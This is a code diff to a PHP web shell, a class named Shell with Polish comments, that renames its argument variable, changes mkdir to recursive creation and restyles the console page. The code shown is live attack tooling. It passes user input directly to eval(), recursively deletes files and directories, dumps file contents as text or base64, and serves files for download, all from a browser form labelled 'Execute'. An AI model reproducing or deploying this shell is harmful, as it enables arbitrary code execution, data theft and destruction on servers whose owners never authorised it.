@@ -90,7 +90,7 @@ class Shell
 	 * @access private
 	 * @var    string
 	 */
-	private $sArg;
+	private $sArgv;
 
 	/**
 	 * Czy funkcja posix_getpwuid istnieje
@@ -302,7 +302,7 @@ echo - Wyświetla tekst
 HELP;
 		}
 
-		return htmlspecialchars( $this -> sArg );
+		return htmlspecialchars( $this -> sArgv );
 	}
 
 	/**
@@ -330,7 +330,7 @@ HELP;
 
 		for( $i = 0; $i < $this -> iArgc; $i++ )
 		{
-			if( ! mkdir( $this -> aArgv[ $i ], 0777  ) )
+			if( ! mkdir( $this -> aArgv[ $i ], 0777, TRUE ) )
 			{
 				$sOutput .= sprintf( "Katalog \"%s\" <span class=\"red\">nie został utworzony</span>\n", $this -> aArgv[ $i ] );
 			}
@@ -441,7 +441,7 @@ HELP;
 		}
 
 		ob_start();
-		eval( $this -> sArg );
+		eval( $this -> sArgv );
 		$sData = ob_get_contents();
 		ob_clean();
 		ob_end_flush();
@@ -972,12 +972,13 @@ HELP;
 		{
 			$aOptions = str_split( substr( $this -> aArgv[0], 1 ) );
 			array_shift( $this -> aArgv );
+			$this -> sArgv = implode( ' ', $this -> aArgv );
 		}
 
 		/**
 		 * Domyslny katalog jezeli nie podano sciezki
 		 */
-		$sDir = ( ! empty( $this -> aArgv[0] ) ? $this -> aArgv[0] : dirname( __FILE__ ) );
+		$sDir = ( ! empty( $this -> sArgv ) ? $this -> sArgv : dirname( __FILE__ ) );
 
 		$bList      = in_array( 'l', $aOptions );
 		$bRecursive = in_array( 'R', $aOptions );
@@ -1000,7 +1001,7 @@ HELP;
 			/**
 			 * Informacja o komendzie jaka wykonalismy
 			 */
-			$sOutput .= sprintf( "%s %s\n\n", $this -> sCmd, $this -> sArg );
+			$sOutput .= sprintf( "%s %s\n\n", $this -> sCmd, $this -> sArgv );
 
 			$sFileName = ( $bRecursive ? 'getPathname' : 'getBasename' );
 
@@ -1045,7 +1046,7 @@ HELP;
 		/**
 		 * Help
 		 */
-		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
 remove, rm, delete, del - Usuwanie pliku / katalogu. Zawartość katalogu zostanie usunięta rekurencyjnie
@@ -1060,23 +1061,23 @@ HELP;
 		/**
 		 * Jezeli podana sciezka to plik
 		 */
-		if( is_file( $this -> aArgv[0] ) )
+		if( is_file( $this -> sArgv ) )
 		{
-			if( ! unlink( $this -> aArgv[0] ) )
+			if( ! unlink( $this -> sArgv ) )
 			{
-				return sprintf( 'Plik "%s" <span class="red">nie został usunięty</span>', $this -> aArgv[0] );
+				return sprintf( 'Plik "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
 			}
 
-			return sprintf( 'Plik "%s" <span class="green">został usunięty</span>', $this -> aArgv[0] );
+			return sprintf( 'Plik "%s" <span class="green">został usunięty</span>', $this -> sArgv );
 		}
 		/**
 		 * Jezeli podana sciezka to katalog
 		 */
-		if( is_dir( $this -> aArgv[0] ) )
+		if( is_dir( $this -> sArgv ) )
 		{
 			try
 			{
-				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $this -> aArgv[0], RecursiveDirectoryIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST );
+				$oDirectory = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $this -> sArgv, RecursiveDirectoryIterator::SKIP_DOTS ), RecursiveIteratorIterator::CHILD_FIRST );
 
 				foreach( $oDirectory as $oFile )
 				{
@@ -1105,9 +1106,9 @@ HELP;
 				/**
 				 * Usuwanie ostatniego katalogu
 				 */
-				if( ! rmdir( $this -> aArgv[0] ) )
+				if( ! rmdir( $this -> sArgv ) )
 				{
-					return $sOutput . sprintf( 'Katalog "%s" <span class="red">nie został usunięty</span>', $this -> aArgv[0] );
+					return $sOutput . sprintf( 'Katalog "%s" <span class="red">nie został usunięty</span>', $this -> sArgv );
 				}
 			}
 			catch( Exception $oException )
@@ -1115,10 +1116,10 @@ HELP;
 				return sprintf( "Nie można otworzyć katalogu \"%s\"\n\nErro: %s", $sDir, $oException -> getMessage()  );
 			}
 
-			return sprintf( 'Katalog "%s" <span class="green">został usunięty</span>', $this -> aArgv[0] );
+			return sprintf( 'Katalog "%s" <span class="green">został usunięty</span>', $this -> sArgv );
 		}
 
-		return sprintf( 'Podana ścieżka "%s" nie istnieje', $this -> aArgv[0] );
+		return sprintf( 'Podana ścieżka "%s" nie istnieje', $this -> sArgv );
 	}
 
 	/**
@@ -1132,7 +1133,7 @@ HELP;
 		/**
 		 * Help
 		 */
-		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
 bcat, b64 - Wyświetlanie zawartości pliku przy użyciu base64
@@ -1148,19 +1149,19 @@ HELP;
 		/**
 		 * Plik zrodlowy musi istniec
 		 */
-		if( ! is_file( $this -> aArgv[0] ) )
+		if( ! is_file( $this -> sArgv ) )
 		{
-			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[0] );
+			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
 		}
 
 		/**
 		 * Naglowek Mime i zrodlo pliku w base64
 		 */
 		$sMime = sprintf( "MIME-Version: 1.0\r\nContent-Type: application/octet-stream; name=\"%s\"\r\nContent-Transfer-Encoding: base64\r\nContent-Disposition: attachment; filename=\"%s\"\r\n\r\n",
-			basename( $this -> aArgv[0] ), basename( $this -> aArgv[0] )
+			basename( $this -> sArgv ), basename( $this -> sArgv )
 		);
 
-		return htmlspecialchars( $sMime . chunk_split( base64_encode( file_get_contents( $this -> aArgv[0] ) ), 130 ) );
+		return htmlspecialchars( $sMime . chunk_split( base64_encode( file_get_contents( $this -> sArgv ) ), 130 ) );
 	}
 
 	/**
@@ -1174,7 +1175,7 @@ HELP;
 		/**
 		 * Help
 		 */
-		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
+		if( ( $this -> iArgc === 0 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
 			return <<<HELP
 cat - Wyświetlanie zawartości pliku
@@ -1190,12 +1191,12 @@ HELP;
 		/**
 		 * Plik zrodlowy musi istniec
 		 */
-		if( ! is_file( $this -> aArgv[0] ) )
+		if( ! is_file( $this -> sArgv ) )
 		{
-			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[0] );
+			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
 		}
 
-		return htmlspecialchars( file_get_contents( $this -> aArgv[0] ) );
+		return htmlspecialchars( file_get_contents( $this -> sArgv ) );
 	}
 
 	/**
@@ -1235,6 +1236,7 @@ HELP;
 		{
 			$aOptions = str_split( substr( $this -> aArgv[0], 1 ) );
 			array_shift( $this -> aArgv );
+			$this -> sArgv = implode( ' ', $this -> aArgv );
 		}
 
 		$bGzip = in_array( 'g', $aOptions );
@@ -1242,9 +1244,9 @@ HELP;
 		/**
 		 * Plik zrodlowy musi istniec
 		 */
-		if( ! is_file( $this -> aArgv[0] ) )
+		if( ! is_file( $this -> sArgv ) )
 		{
-			return sprintf( 'Plik "%s" nie istnieje', $this -> aArgv[0] );
+			return sprintf( 'Plik "%s" nie istnieje', $this -> sArgv );
 		}
 
 		/**
@@ -1261,14 +1263,14 @@ HELP;
 		 * Naglowki
 		 */
 		header( 'Cache-Control: must-revalidate, post-check=0, pre-check=0', TRUE );
-		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> aArgv[0] ) ), TRUE );
+		header( sprintf( 'Content-Disposition: attachment; filename="%s"', basename( $this -> sArgv ) ), TRUE );
 		header( 'Content-Type: application/octet-stream', TRUE );
 
-		if( ( $rFile = fopen( $this -> aArgv[0], 'r' ) ) !== FALSE )
+		if( ( $rFile = fopen( $this -> sArgv, 'r' ) ) !== FALSE )
 		{
 			if( ! $bGzip )
 			{
-				header( sprintf( 'Content-Length: %s', filesize( $this -> aArgv[0] ) ), TRUE );
+				header( sprintf( 'Content-Length: %s', filesize( $this -> sArgv ) ), TRUE );
 			}
 
 			while( ! feof( $rFile ) )
@@ -1531,14 +1533,14 @@ HELP;
 				$this -> sCmd = substr( $sCmd, 1 );
 			}
 
-			$this -> sArg = preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd );
+			$this -> sArgv = preg_replace( sprintf( '~^\:%s[\s+]?~', $this -> sCmd ), NULL, $sCmd );
 
 			/**
 			 * Rozdzielanie argumentow
 			 *
 			 * "sciezka do \"pliku\"" -> sciezka do "pliku"
 			 */
-			if( preg_match_all( '~\'(?:(?:\\\')|.*)\'|"(?:(?:\\")|(.*))"|[^ \r\n\t\'"]+~', $this -> sArg, $aMatch ) );
+			if( preg_match_all( '~\'(?:(?:\\\')|.*)\'|"(?:(?:\\")|(.*))"|[^ \r\n\t\'"]+~', $this -> sArgv, $aMatch ) );
 			{
 				/**
 				 * Usuwanie koncowych znakow " oraz ', zamienianie \" na " i \' na '
@@ -1695,11 +1697,13 @@ HELP;
 			exit ;
 		}
 
-		$sContent  = sprintf( '<pre id="console">%s</pre><br />', $sConsole );
+		$sContent  = sprintf( '<pre id="console">%s</pre>', $sConsole );
+		$sContent .= '<div>';
 		$sContent .= Form::open();
 		$sContent .= Form::inputText( 'cmd', $sCmd, TRUE, array( 'size' => 110, 'id' => 'cmd' ) );
-		$sContent .= Form::inputSubmit( 'submit', 'Send', array( 'id' => 'cmd-send' ) );
+		$sContent .= Form::inputSubmit( 'submit', 'Execute', array( 'id' => 'cmd-send' ) );
 		$sContent .= Form::close();
+		$sContent .= '</div>';
 
 		return $this -> getContent( $sContent );
 	}
@@ -1718,12 +1722,7 @@ HELP;
 		$sGeneratedIn = sprintf( '%.5f', microtime( 1 ) - $this -> fGeneratedIn );
 		$sTitle = sprintf( 'Shell @ %s (%s)', Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ) );
 return <<<CONTENT
-<!DOCTYPE HTML>
-<html>
-<head>
-<title>{$sTitle}</title>
-<meta charset="utf-8">
-<style>
+<!DOCTYPE HTML><html><head><title>{$sTitle}</title><meta charset="utf-8"><style>
 body{background-color:#eef7fb;color:#000;font-size:12px;font-family:sans-serif, Verdana, Tahoma, Arial;margin:10px;padding:0;}
 a{color:#226c90;text-decoration:none;}
 a:hover{color:#5a9cbb;text-decoration:underline;}
@@ -1732,16 +1731,17 @@ table{background-color:#fff;border:1px solid #e2ecf2;border-radius:20px;-moz-bor
 td{background-color:#f8f8f8;border-radius:5px;-moz-border-radius:5px;margin:0px;padding:0px;padding-left:4px}
 th{color:#054463;font-size:14px;font-weight:bold;background-color:#f2f2f2;border-radius:5px;-moz-border-radius:5px;margin:0;padding:2px}
 hr{margin-top:20px;background-color:#eef7fb;border:1px solid #eef7fb;}
-div#body{text-align:center;border:3px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;min-width:950px;background-color:#fff;margin:0 auto;padding:20px;}
+div#body{text-align:center;border:3px solid #e2ecf2;border-radius:20px;-moz-border-radius:20px;min-width:940px;background-color:#fff;margin:0 auto;padding:8px 20px 10px 20px}
 div#menu{margin:0 auto;text-align:left;}
-div#bottom{margin:0 auto}
+div#bottom{margin:10px auto}
 div#content{margin:0 auto;padding-top:10px}
-pre#console{text-align:left;margin: 0 auto;height:400px;min-height:400px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;padding:8px;overflow:scroll}
-input#cmd{width:95%;font-size:14px;margin-top:10px; padding: 4px;}
+pre#console{text-align:left;margin: 0 auto;height:350px;min-height:350px;width:98%;font-size:11px;background-color:#f9f9f9;color:#000;border:3px solid #e2ecf2;padding:2px;overflow:scroll}
+input{padding:6px;border-radius:10px;-moz-border-radius:10px;border:1px solid #aaa;background-color:#fff;font-size:14px}
+input#cmd{width:89%;margin-top:10px;padding-left:10px;}
+input#cmd:hover{background-color:#f1f1f1;}
+input#cmd-send{margin-top:10px;margin-left:20px;}
 .green{color:#55b855;font-weight:bold}
-.red{color:#fb5555;font-weight:bold}
-
-</style>
+.red{color:#fb5555;font-weight:bold}</style>
 </head>
 <body>
 </body>
